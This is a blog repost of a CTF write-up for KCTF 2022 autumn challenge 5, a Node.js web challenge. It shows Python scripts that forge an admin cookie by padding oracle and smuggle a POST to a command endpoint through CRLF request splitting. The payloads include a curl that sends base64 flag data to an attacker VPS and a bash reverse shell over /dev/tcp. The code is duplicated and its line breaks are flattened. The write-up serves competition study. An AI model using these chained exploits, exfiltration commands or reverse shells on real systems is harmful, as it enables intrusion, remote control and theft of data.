@@ -1,0 +1,199 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>看雪2022 KCTF 秋季赛 | 第五题设计思路及解析 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="KCTF2022秋Q5《灾荒蔓延》Web：Node.js 8 padding oracle伪造admin+CRLF HTTP走私到&#x2F;C00mmmmanD执行命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="看雪2022 KCTF 秋季赛 | 第五题设计思路及解析">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/%E7%9C%8B%E9%9B%AA2022_KCTF_%E7%A7%8B%E5%AD%A3%E8%B5%9B_-_%E7%AC%AC%E4%BA%94%E9%A2%98%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="KCTF2022秋Q5《灾荒蔓延》Web：Node.js 8 padding oracle伪造admin+CRLF HTTP走私到&#x2F;C00mmmmanD执行命令">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Node.js 8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/%E7%9C%8B%E9%9B%AA2022_KCTF_%E7%A7%8B%E5%AD%A3%E8%B5%9B_-_%E7%AC%AC%E4%BA%94%E9%A2%98%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '看雪2022 KCTF 秋季赛 | 第五题设计思路及解析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">看雪2022 KCTF 秋季赛 | 第五题设计思路及解析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="看雪2022 KCTF 秋季赛 | 第五题设计思路及解析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/81346.html">https://www.ctfiot.com/81346.html</a><br>ID: 81346</p>
+</blockquote>
+<p>看雪 2022 KCTF秋季赛 已于11月15日中午12点正式开始！比赛延续上一届的模式并进行优化，对每道题设置了难度值、火力值、精致度等多类积分，用规则引导题目的难度和趣味度。大家请注意：签到题（<a target="_blank" rel="noopener" href="https://ctf.pediy.com/game-season_fight-216.htm%EF%BC%89%E5%B0%86%E6%8C%81%E7%BB%AD%E5%BC%80%E6%94%BE%EF%BC%8C%E6%95%B4%E4%B8%AA%E6%AF%94%E8%B5%9B%E6%9C%9F%E9%97%B4%E5%9D%87%E5%8F%AF%E6%8F%90%E4%BA%A4%E7%AD%94%E6%A1%88%EF%BC%8C%E8%8E%B7%E5%BE%97%E7%A7%AF%E5%88%86%E5%93%A6%EF%BD%9E">https://ctf.pediy.com/game-season_fight-216.htm）将持续开放，整个比赛期间均可提交答案，获得积分哦～</a></p>
+<p>今日中午12点，第五题《灾荒蔓延》已截止答题。本题围观人数共1k+，攻破战队数：2，分别是【98k】和【摸鱼划水打酱油】</p>
+<p>下面一起看看该赛题的设计思路和相关解析吧~</p>
+<p>出题团队简介</p>
+<p>第五题《灾荒蔓延》出题方 星盟一分队玄机 战队，战队成员id：Achillesweb</p>
+<p>赛题设计思路</p>
+<p>作者（Achilles）来自星盟安全团队。</p>
+<p>这是一个node项目，题目需要比赛者ssrf进而命令执行获得藏在比赛题目源代码中的flag。黑盒，不给源代码附件。</p>
+<p>先访问&#x2F;admin，发现它是解密cookie判断是不是管理员，用padding oracle attack伪造管理员cookie<br>http.get函数在node的8版本（其中的较低版本）或者更低版本存在被http拆分攻击危险。攻击者通过这个漏洞可以达到http走私的效果。<br>通过走私满足&#x2F;C00mmmmanD对ip的要求，从而命令执行<br>下面是一把梭脚本，注意把这个脚本放在这个项目<a target="_blank" rel="noopener" href="https://github.com/pspaul/padding-oracle%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E3%80%82%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E6%98%AF">https://github.com/pspaul/padding-oracle文件夹里面。这个脚本执行的命令是</a></p>
+<figure class="highlight plaintext"><figcaption><span>xxxx:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">xxx/?`cat kctf.js|grep flag|base64`</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-import urllib.parsefrom http.cookies import SimpleCookieimport requests</span><br><span class="line">from padding_oracle import PaddingOracle</span><br><span class="line">from optimized_alphabets import json_alphabet</span><br><span class="line">attackIP = &quot;&quot;attackPort = &quot;&quot;vpsIP = &quot;&quot;vpsPort = &quot;&quot;</span><br><span class="line">def payload_encode(raw): payload = raw.replace(&#x27;n&#x27;, &#x27;u010du010a&#x27;) .replace(&#x27;+&#x27;, &#x27;u012b&#x27;) .replace(&#x27; &#x27;, &#x27;u0120&#x27;) .replace(&#x27;&quot;&#x27;, &#x27;u0122&#x27;) .replace(&quot;&#x27;&quot;, &#x27;u0a27&#x27;) .replace(&#x27;[&#x27;, &#x27;u015b&#x27;) .replace(&#x27;]&#x27;, &#x27;u015d&#x27;) .replace(&#x27;`&#x27;, &#x27;u0127&#x27;) .replace(&#x27;&quot;&#x27;, &#x27;u0122&#x27;) .replace(&quot;&#x27;&quot;, &#x27;u0a27&#x27;) .replace(&#x27;[&#x27;, &#x27;u015b&#x27;) .replace(&#x27;]&#x27;, &#x27;u015d&#x27;) return payload</span><br><span class="line">def oracle(cipher_hex): headers = &#123;&#x27;Cookie&#x27;:&quot;isadmin=&#123;&#125;&quot;.format(cipher_hex)&#125; r = requests.get(&quot;http://&quot;+attackIP+&quot;:&quot;+attackPort+&quot;/admin&quot;,headers = headers) response = r.content if b&quot;Decrypt error&quot; not in response: return True else: return False</span><br><span class="line">def step1(): r = requests.get(url=&quot;http://&quot;+attackIP+&quot;:&quot;+attackPort) cookie = SimpleCookie(r.headers[&#x27;Set-Cookie&#x27;]) cookie = cookie[&quot;isadmin&quot;].value return cookie</span><br><span class="line">def step2(cipher): o = PaddingOracle(oracle, max_retries=-1) plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet()) plain_new = b&quot;&#123;&quot;admin&quot;:&quot;1&quot;&#125;&quot; cipher_new = o.craft(cipher, plain, plain_new) return cipher_new</span><br><span class="line">def step3(new_cookie): payload = &quot; HTTP/1.1nnPOST /C00mmmmanD HTTP/1.1nHost: 127.0.0.1nCookie: isadmin=&#123;&#125;nConnection: closenContent-Type: application/x-www-form-urlencodednContent-Length: 75nncmd=curl%20&quot;+vpsIP+&quot;%3A&quot;+vpsPort+&quot;%3F%60cat%20kctf.js%7Cgrep%20flag%7Cbase64%60nnGET / HTTP/1.1ntest:&quot; payload = payload.format(new_cookie) payload = payload_encode(payload) r = requests.get(&quot;http://&quot;+attackIP+&quot;:&quot;+attackPort+&quot;/search?url=http://127.0.0.1:&quot;+attackPort+&quot;/&quot; + urllib.parse.quote(payload))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;: cookie = step1() new_cookie = step2(cookie) step3(new_cookie)</span><br><span class="line"></span><br><span class="line">赛题解析</span><br><span class="line"></span><br><span class="line">访问主页会给一个 isadmin 的 cookie, 带上此 cookie 直接访问 /admin, 发现提示不是 admin。</span><br><span class="line"></span><br><span class="line">对 cookie 最后一位修改后提示 decrypt error, 再结合 unhexlify 后长度 32, 可以猜出是分块加密。</span><br><span class="line"></span><br><span class="line">然后修改第一位, 提示 json parse error, 那么可以得知大概率是 CBC 模式 + PKCS7 Padding。</span><br><span class="line"></span><br><span class="line">import binascii import requests # https://github.com/mwielgoszewski/python-paddingoracle</span><br><span class="line">from paddingoracle import PaddingOracle, BadPaddingException class PadBuster(PaddingOracle): def __init__(self, session: requests.Session, wait: float = 0.1, **kwargs): super(PadBuster, self).__init__(**kwargs) self.session = session self.wait = wait def oracle(self, data, **kwargs): token = binascii.hexlify(data).decode() resp = None while True: try: resp = self.session.get(&#x27;http://150.158.18.137:</span><br><span class="line">5329/admin&#x27;, cookies=&#123; &#x27;isadmin&#x27;: token &#125;) break </span><br><span class="line">except requests.HTTPError: # time.sleep(self.wait) continue self.history.append(resp) if &#x27;Decrypt error&#x27; not in resp.text: return else: raise BadPaddingException sess = requests.session()pad_buster = PadBuster(sess) ct = binascii.unhexlify(&#x27;b60bdcada90e7c628b68d0ed965363858dc1695757156638e9b86ac59c99e7c2&#x27;)print(len(ct))print(ct) # admin_token = pad_buster.decrypt(ct[16:], block_size=16, iv=ct[:16])</span><br><span class="line"># print(admin_token)</span><br><span class="line"># b&#x27;&#123;&quot;admin&quot;:&quot;0&quot;&#125;x03x03x03&#x27; iv = bytearray(ct[:16])iv[10] = iv[10] ^ ord(&#x27;0&#x27;) ^ ord(&#x27;1&#x27;) print(binascii.hexlify(bytes(iv) + ct[16:]))</span><br><span class="line"></span><br><span class="line">通过 padding oracle 可以解出是 &#123;“admin”:”0″&#125;x03x03x03, 那么直接构造 iv 使得 CBC 解密出来 admin 为 1 即可。</span><br><span class="line"></span><br><span class="line">使用构造的 cookie 访问 /admin, 提示 post cmd 到 /C00mmmmanD. 但是此时即使带上 isadmin cookie 访问 /C00mmmmanD 却还提示不是 admin, 那么大概率要结合一开始的 /search 的接口来 SSRF。</span><br><span class="line"></span><br><span class="line">但是 search 只能发送 GET 请求, 由 Http banner 可以得知服务器是 express, 搜索 node 的 CRLF, 可以搜到 https://xz.aliyun.com/t/2894直接用同样的方法测试可以利用, 那么直接构造请求 POST /C00mmmmanD 即可。</span><br><span class="line"></span><br><span class="line">import requests sess = requests.session() CRLF = &#x27;č̊&#x27;BLANK = &#x27;̠&#x27; r = f&#x27;&#x27;&#x27;1 HTTP/1.1Cookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Connection: keep-aliveHost: 127.0.0.1 POST /C00mmmmanD HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.86.0Accept: */*Connection: closeCookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Content-Type: application/x-www-form-urlencodedContent-Length: 72 cmd=bash -c &quot;bash -i &gt;%2526 /dev/tcp/ip/port 0&gt;%25261&quot; &#x27;&#x27;&#x27;.replace(&#x27;n&#x27;, CRLF).replace(&#x27; &#x27;, BLANK) # 记得修改 Content-Lengthprint(r)r = sess.get(&#x27;http://150.158.18.137:</span><br><span class="line">5329/search?url=http://127.0.0.1:</span><br><span class="line">5329/C00mmmmanD?a=&#x27; + r) print(r.text)</span><br><span class="line"></span><br><span class="line">第六题《病疫先兆》比赛正在进行</span><br><span class="line"></span><br><span class="line">欢迎参与和围观</span><br><span class="line"></span><br><span class="line">– End –</span><br><span class="line"></span><br><span class="line">球分享</span><br><span class="line"></span><br><span class="line">球点赞</span><br><span class="line"></span><br><span class="line">球在看</span><br><span class="line"></span><br><span class="line">戳“阅读原文”查看详情！</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先访问&#x2F;admin，发现它是解密cookie判断是不是管理员，用padding oracle attack伪造管理员cookie<br>http.get函数在node的8版本（其中的较低版本）或者更低版本存在被http拆分攻击危险。攻击者通过这个漏洞可以达到http走私的效果。<br>通过走私满足&#x2F;C00mmmmanD对ip的要求，从而命令执行<br>下面是一把梭脚本，注意把这个脚本放在这个项目<a target="_blank" rel="noopener" href="https://github.com/pspaul/padding-oracle%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E3%80%82%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E6%98%AF">https://github.com/pspaul/padding-oracle文件夹里面。这个脚本执行的命令是</a></p>
+<figure class="highlight plaintext"><figcaption><span>xxxx:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">xxx/?`cat kctf.js|grep flag|base64`</span><br><span class="line"># -*- coding: utf-8 -*-import urllib.parsefrom http.cookies import SimpleCookieimport requests</span><br><span class="line">from padding_oracle import PaddingOracle</span><br><span class="line">from optimized_alphabets import json_alphabet</span><br><span class="line">attackIP = &quot;&quot;attackPort = &quot;&quot;vpsIP = &quot;&quot;vpsPort = &quot;&quot;</span><br><span class="line">def payload_encode(raw): payload = raw.replace(&#x27;n&#x27;, &#x27;u010du010a&#x27;) .replace(&#x27;+&#x27;, &#x27;u012b&#x27;) .replace(&#x27; &#x27;, &#x27;u0120&#x27;) .replace(&#x27;&quot;&#x27;, &#x27;u0122&#x27;) .replace(&quot;&#x27;&quot;, &#x27;u0a27&#x27;) .replace(&#x27;[&#x27;, &#x27;u015b&#x27;) .replace(&#x27;]&#x27;, &#x27;u015d&#x27;) .replace(&#x27;`&#x27;, &#x27;u0127&#x27;) .replace(&#x27;&quot;&#x27;, &#x27;u0122&#x27;) .replace(&quot;&#x27;&quot;, &#x27;u0a27&#x27;) .replace(&#x27;[&#x27;, &#x27;u015b&#x27;) .replace(&#x27;]&#x27;, &#x27;u015d&#x27;) return payload</span><br><span class="line">def oracle(cipher_hex): headers = &#123;&#x27;Cookie&#x27;:&quot;isadmin=&#123;&#125;&quot;.format(cipher_hex)&#125; r = requests.get(&quot;http://&quot;+attackIP+&quot;:&quot;+attackPort+&quot;/admin&quot;,headers = headers) response = r.content if b&quot;Decrypt error&quot; not in response: return True else: return False</span><br><span class="line">def step1(): r = requests.get(url=&quot;http://&quot;+attackIP+&quot;:&quot;+attackPort) cookie = SimpleCookie(r.headers[&#x27;Set-Cookie&#x27;]) cookie = cookie[&quot;isadmin&quot;].value return cookie</span><br><span class="line">def step2(cipher): o = PaddingOracle(oracle, max_retries=-1) plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet()) plain_new = b&quot;&#123;&quot;admin&quot;:&quot;1&quot;&#125;&quot; cipher_new = o.craft(cipher, plain, plain_new) return cipher_new</span><br><span class="line">def step3(new_cookie): payload = &quot; HTTP/1.1nnPOST /C00mmmmanD HTTP/1.1nHost: 127.0.0.1nCookie: isadmin=&#123;&#125;nConnection: closenContent-Type: application/x-www-form-urlencodednContent-Length: 75nncmd=curl%20&quot;+vpsIP+&quot;%3A&quot;+vpsPort+&quot;%3F%60cat%20kctf.js%7Cgrep%20flag%7Cbase64%60nnGET / HTTP/1.1ntest:&quot; payload = payload.format(new_cookie) payload = payload_encode(payload) r = requests.get(&quot;http://&quot;+attackIP+&quot;:&quot;+attackPort+&quot;/search?url=http://127.0.0.1:&quot;+attackPort+&quot;/&quot; + urllib.parse.quote(payload))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;: cookie = step1() new_cookie = step2(cookie) step3(new_cookie)</span><br><span class="line">import binascii import requests # https://github.com/mwielgoszewski/python-paddingoracle</span><br><span class="line">from paddingoracle import PaddingOracle, BadPaddingException class PadBuster(PaddingOracle): def __init__(self, session: requests.Session, wait: float = 0.1, **kwargs): super(PadBuster, self).__init__(**kwargs) self.session = session self.wait = wait def oracle(self, data, **kwargs): token = binascii.hexlify(data).decode() resp = None while True: try: resp = self.session.get(&#x27;http://150.158.18.137:</span><br><span class="line">5329/admin&#x27;, cookies=&#123; &#x27;isadmin&#x27;: token &#125;) break </span><br><span class="line">except requests.HTTPError: # time.sleep(self.wait) continue self.history.append(resp) if &#x27;Decrypt error&#x27; not in resp.text: return else: raise BadPaddingException sess = requests.session()pad_buster = PadBuster(sess) ct = binascii.unhexlify(&#x27;b60bdcada90e7c628b68d0ed965363858dc1695757156638e9b86ac59c99e7c2&#x27;)print(len(ct))print(ct) # admin_token = pad_buster.decrypt(ct[16:], block_size=16, iv=ct[:16])</span><br><span class="line"># print(admin_token)</span><br><span class="line"># b&#x27;&#123;&quot;admin&quot;:&quot;0&quot;&#125;x03x03x03&#x27; iv = bytearray(ct[:16])iv[10] = iv[10] ^ ord(&#x27;0&#x27;) ^ ord(&#x27;1&#x27;) print(binascii.hexlify(bytes(iv) + ct[16:]))</span><br><span class="line">import requests sess = requests.session() CRLF = &#x27;č̊&#x27;BLANK = &#x27;̠&#x27; r = f&#x27;&#x27;&#x27;1 HTTP/1.1Cookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Connection: keep-aliveHost: 127.0.0.1 POST /C00mmmmanD HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.86.0Accept: */*Connection: closeCookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Content-Type: application/x-www-form-urlencodedContent-Length: 72 cmd=bash -c &quot;bash -i &gt;%2526 /dev/tcp/ip/port 0&gt;%25261&quot; &#x27;&#x27;&#x27;.replace(&#x27;n&#x27;, CRLF).replace(&#x27; &#x27;, BLANK) # 记得修改 Content-Lengthprint(r)r = sess.get(&#x27;http://150.158.18.137:</span><br><span class="line">5329/search?url=http://127.0.0.1:</span><br><span class="line">5329/C00mmmmanD?a=&#x27; + r) print(r.text)</span><br></pre></td></tr></table></figure>
+
+
+<hr>
